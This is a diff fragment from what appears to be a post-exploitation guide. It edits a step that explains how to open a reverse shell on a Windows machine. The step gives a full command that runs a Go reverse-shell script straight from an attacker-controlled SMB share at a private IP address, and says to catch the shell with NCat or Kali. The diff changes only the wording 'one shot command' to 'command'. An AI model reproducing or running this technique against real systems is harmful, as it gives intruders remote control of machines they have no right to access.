@@ -26,7 +26,7 @@ Post exploitation Techniques
 3. Have a Kali Box or NCat on your Windows Attack Box to catch the Reverse Shell
 4. Share the Folder where your Python/Java/Go.exe Application is
 5. Have your Reverse Shell script also in the same folder
-6. Run your one shot command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.
+6. Run your command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.
 
   ![image](https://user-images.githubusercontent.com/130473605/235157805-16805cb8-0019-44a7-acb2-4717a273c60a.png)
 
